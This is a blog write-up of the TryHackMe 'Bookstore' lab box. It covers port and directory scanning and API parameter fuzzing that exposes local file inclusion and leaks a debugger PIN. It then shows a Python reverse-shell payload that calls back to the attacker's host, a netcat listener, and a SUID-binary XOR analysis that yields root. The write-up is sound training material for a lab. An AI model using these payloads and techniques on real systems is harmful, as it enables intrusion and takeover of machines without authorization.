---
layout: post
title: TryHackMe - Bookstore
date: 2023-09-08 16:32:00 +0700
tags: [security, web, rest api, api security]
toc: true
math: true
---

<p class="message">A Beginner level box with basic web enumeration and REST API Fuzzing.</p>

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn bookstore.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 02:53 EDT
Warning: 10.10.21.201 giving up on port because retransmission cap hit (10).
Nmap scan report for bookstore.thm (10.10.21.201)
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 22,80,5000 bookstore.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 02:54 EDT
Nmap scan report for bookstore.thm (10.10.21.201)
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 440e60ab1e865b442851db3f9b122177 (RSA)
|   256 592f70769f65abdc0c7dc1a2a34de640 (ECDSA)
|_  256 109f0bddd64dc77a3dff52421d296eba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-title: Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   185.65 ms 10.9.0.1
2   185.86 ms bookstore.thm (10.10.21.201)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
```

### Dir Scan

So there are 2 ports running **http** service: `80` and `5000`. Let’s enumerate them with directories scanning first:

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ gobuster dir -w directory-list-2.3-medium.txt -t 50 --no-error -u http://bookstore.thm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w Wordlists/directory-list-2.3-medium.txt -t 40 --no-error -u http://bookstore.thm:5000/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm:5000/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                Wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 45]
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
```

Get through these directories, I found 2 interested notes:

`/assets/js/api.js`

```
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

`/login.html`

```
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

It talked about the **PIN**. Coincidently, the below path also required a **PIN** to activate the _Interactive Console_:

`/console`

![Untitled](/assets/Bookstore%20images/Untitled.png)

Enumerate the _api_ mentioned from the comment line:

`/api/`

![Untitled](/assets/Bookstore%20images/Untitled%201.png)

It actually using the `v2` which is the second version, following the instructions and verify that the API is well working:

```
┌──(kali㉿kali)-[~/TryHackMe/Bookstore]
└─$ curl http://bookstore.thm:5000/api/v2/resources/books?id=1
[
  {
    "author": "Ann Leckie ",
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.",
    "id": "1",
    "published": 2014,
    "title": "Ancillary Justice"
  }
]
```

How about _the previous version_ one? Take a rapid check:

```
┌──(kali㉿kali)-[~/TryHackMe/Bookstore]
└─$ curl http://bookstore.thm:5000/api/v1/resources/books?id=1
[
  {
    "author": "Ann Leckie ",
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.",
    "id": "1",
    "published": 2014,
    "title": "Ancillary Justice"
  }
]
```

So, it still work! The note said it is vulnerable with the **LFI** → Can we exploit it?

```
┌──(kali㉿kali)-[~/TryHackMe/Bookstore]
└─$ curl http://bookstore.thm:5000/api/v1/resources/books?id=.bash_history
[]
```

Nahhh! It’s not easy like that. The problem might be the parameter, the `id` and `author` and `published` are all legal. Then we need to do a **Parameter Scanning/Fuzzing**

### Parameter Fuzzing

At first, I insert no filter flag to see what is the default `Lines`, `Word` and `Chars` response:

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ wfuzz -w fuzz-lfi-params-list.txt -u http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      1 W        3 Ch        "id"
000000003:   404        1 L      8 W        66 Ch       "page"
000000007:   404        1 L      8 W        66 Ch       "email"
000000014:   404        1 L      8 W        66 Ch       "submit"
000000013:   404        1 L      8 W        66 Ch       "q"
000000015:   404        1 L      8 W        66 Ch       "user"
000000012:   404        1 L      8 W        66 Ch       "code"
000000009:   404        1 L      8 W        66 Ch       "username"
000000011:   404        1 L      8 W        66 Ch       "title"
000000010:   404        1 L      8 W        66 Ch       "file"
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 10
Filtered Requests: 0
Requests/sec.: 0
```

After identifying the status, I then append the `--hw` flag to filter all the responses which would have the same result with `8` **Word**:

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ wfuzz -w fuzz-lfi-params-list.txt -u http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history --hw 8
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      1 W        3 Ch        "id"
000000069:   200        7 L      11 W       116 Ch      "[REDACTED]"
000000100:   200        1 L      1 W        3 Ch        "author"
000000815:   200        1 L      1 W        3 Ch        "published"

Total time: 296.1410
Processed Requests: 2588
Filtered Requests: 2584
Requests/sec.: 8.739078
```

Beside 3 parameters were mentioned in the instructions of `/api/` page, the left one is the illegal and it might cause the **LFI** vulnerability → Have a check:

```
┌──(kali㉿kali)-[~/TryHackMe/Bookstore]
└─$ curl http://bookstore.thm:5000/api/v1/resources/books?[REDACTED]=.bash_history
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=[REDACTED]
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

It worked! Use the leaked information above to activate the **Interactive Console** from `/console`

## Exploit

![Untitled](/assets/Bookstore%20images/Untitled%202.png)

As it said, this console is a **Python debugger** → To perform the **RCE** attack, we need to execute a **Python** payload:

```
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.63.75",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

![Untitled](/assets/Bookstore%20images/Untitled%203.png)

Remember to start a listener on the local machine before executing the reverse shell payload:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.91.205] 46572
$ id
id
uid=1000(sid) gid=1000(sid) groups=1000(sid)
$
```

Since we are connected via the shell, let’s upgrade to a better shell using `pty` and get the user flag:

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
sid@bookstore:~$ ls -l
ls -l
total 44
-r--r--r-- 1 sid  sid  4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
-rw-rw-r-- 1 sid  sid 16384 Oct 19  2020 books.db
-rwsrwsr-x 1 root sid  8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
sid@bookstore:~$ cat user.txt
cat user.txt
[REDACTED]
```

## Privilege Escalation → root

In the current directory, the `try-harder` is set with **SUID** permission as user **root**:

```
-rwsrwsr-x 1 root sid  8488 Oct 20  2020 try-harder
```

This binary could be the way we can use to escalate our privilege to higher → Transfer it to the local machine for analyzing:

```
sid@bookstore:~$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.9.63.75 - - [08/Sep/2023 13:39:24] "GET /try-harder HTTP/1.1" 200 -
^C
```

<p class="message">
❗ After transferring and pressing Ctrl+C to stop the http.server, the shell would be broken and you cannot get back to it even re-execute the reverse shell payload. Therefore, the only way I’ve known is terminating the server and restarting it once again. It’ll take time~

</p>

Simply use `file` command to identify the file’s type:

```
┌──(kali㉿kali)-[~/TryHackMe/Bookstore]
└─$ file try-harder
try-harder: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped
```

As I expect, it is an **ELF** executable file. Then we need to run debugger to see what does it actually do or how does it work. You can use `ghidra` for a better view with source code, but I would simply use `r2` because I prefer the terminal view:

```
; DATA XREF from entry0 @ 0x6bd
┌ 156: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_10h @ rbp-0x10
│           ; var uint32_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           0x000007aa      55             push rbp
│           0x000007ab      4889e5         mov rbp, rsp
│           0x000007ae      4883ec20       sub rsp, 0x20
│           0x000007b2      64488b042528.  mov rax, qword fs:[0x28]
│           0x000007bb      488945f8       mov qword [var_8h], rax
│           0x000007bf      31c0           xor eax, eax
│           0x000007c1      bf00000000     mov edi, 0
│           0x000007c6      e8b5feffff     call sym.imp.setuid
│           0x000007cb      c745f0b35d00.  mov dword [var_10h], 0x5db3
│           0x000007d2      488d3dfb0000.  lea rdi, str.Whats_The_Magic_Number__ ; 0x8d4 ; "What's The Magic Number?!" ; const char *s
│           0x000007d9      e862feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000007de      488d45ec       lea rax, [var_14h]
│           0x000007e2      4889c6         mov rsi, rax
│           0x000007e5      488d3d020100.  lea rdi, [0x000008ee]       ; "%d" ; const char *format
│           0x000007ec      b800000000     mov eax, 0
│           0x000007f1      e87afeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000007f6      8b45ec         mov eax, dword [var_14h]
│           0x000007f9      3516110000     xor eax, 0x1116
│           0x000007fe      8945f4         mov dword [var_ch], eax
│           0x00000801      8b45f0         mov eax, dword [var_10h]
│           0x00000804      3145f4         xor dword [var_ch], eax
│           0x00000807      817df4f421cd.  cmp dword [var_ch], 0x5dcd21f4
│       ┌─< 0x0000080e      7513           jne 0x823
│       │   0x00000810      488d3dda0000.  lea rdi, str._bin_bash__p   ; 0x8f1 ; "/bin/bash -p" ; const char *string
│       │   0x00000817      b800000000     mov eax, 0
│       │   0x0000081c      e83ffeffff     call sym.imp.system         ; int system(const char *string)
│      ┌──< 0x00000821      eb0c           jmp 0x82f
│      ││   ; CODE XREF from main @ 0x80e
│      │└─> 0x00000823      488d3dd40000.  lea rdi, str.Incorrect_Try_Harder ; 0x8fe ; "Incorrect Try Harder" ; const char *s
│      │    0x0000082a      e811feffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from main @ 0x821
│      └──> 0x0000082f      90             nop
│           0x00000830      488b45f8       mov rax, qword [var_8h]
│           0x00000834      644833042528.  xor rax, qword fs:[0x28]
│       ┌─< 0x0000083d      7405           je 0x844
│       │   0x0000083f      e80cfeffff     call sym.imp.__stack_chk_fail
│       │   ; CODE XREF from main @ 0x83d
│       └─> 0x00000844      c9             leave
└           0x00000845      c3             ret
```

![Untitled](/assets/Bookstore%20images/Untitled%204.png)

If you are not familiar with the assembly code like this, don’t worry, neither am I. Accordingly, I will try my best to explain these things following my own knowledge

### Break-down Code

First of all, after requiring the user to input a **Magic Number**, the application uses the `scanf` to read the input as `int` (integer) and convert it to _hexa-decimal_ type within `const char _format_:

```
0x000007f1      e87afeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
```

It then implements the **XOR** (exclusive or) operation with the value `0x1116`:

```
0x000007f6      8b45ec         mov eax, dword [var_14h]
0x000007f9      3516110000     xor eax, 0x1116
```

And it keep **XOR** the result with the `var_10h`:

```
0x00000801      8b45f0         mov eax, dword [var_10h]
0x00000804      3145f4         xor dword [var_ch], eax
```

Which is defined as `0x5db3` before:

```
0x000007cb      c745f0b35d00.  mov dword [var_10h], 0x5db3
```

After all, the final result will be compared with the value `0x5dcd21f4`:

```
0x00000807      817df4f421cd.  cmp dword [var_ch], 0x5dcd21f4
```

If the comparation is true (correct), the command `/bin/bash -p` would be executed and the current user will get the **root** shell (become the **root** user):

```
0x00000810      488d3dda0000.  lea rdi, str._bin_bash__p   ; 0x8f1 ; "/bin/bash -p" ; const char *string
```

These stuff is not really hard as you think, let’s do some math!

### Solve math

Firsly, I convert the hexa-decimal string back to `int` which is actually decimal (because the input value - magic number - is decimal):

```
┌──(kali㉿kali)-[~]
└─$ hURL -i "0x5db3"

Original hex         :: 0x5db3
Converted to integer :: 23987

┌──(kali㉿kali)-[~]
└─$ hURL -i "0x1116"

Original hex         :: 0x1116
Converted to integer :: 4374

┌──(kali㉿kali)-[~]
└─$ hURL -i "0x5dcd21f4"

Original hex         :: 0x5dcd21f4
Converted to integer :: 1573724660
```

And now, write down all the analysis information as mathematic:

$$
magicNumber \oplus 1116_{16} \oplus 5db3_{16} = 5dcd21f4_{16}
$$

$$
\to magicNumber \oplus 4374_{10} \oplus 23987_{10} = 1573724660_{10}
$$

$$
\to magicNumber =4374_{10} \oplus 23987_{10} \oplus 1573724660_{10}
$$

<p class="message">
💡 Don’t concern the permutation and their order, they are all the same in XOR operation.

</p>

You can solve the last operation with **Python** or any other tools or online web page as you want.

We got the **Magic Number →** back to the reverse shell → Execute the `try-harder` → Input our result → Get the **root** shell → Take the flag:

```
sid@bookstore:~$ ./try-harder
./try-harder
What's The Magic Number?!
[REDACTED]
[REDACTED]
root@bookstore:~# id
id
uid=0(root) gid=1000(sid) groups=1000(sid)
root@bookstore:~# cd /root
cd /root
root@bookstore:/root# ls -l
ls -l
total 8
-r-------- 1 root root   33 Oct 19  2020 root.txt
drwxr-xr-x 2 sid  sid  4096 Oct 20  2020 s
root@bookstore:/root# cat root.txt
cat root.txt
[REDACTED]
```
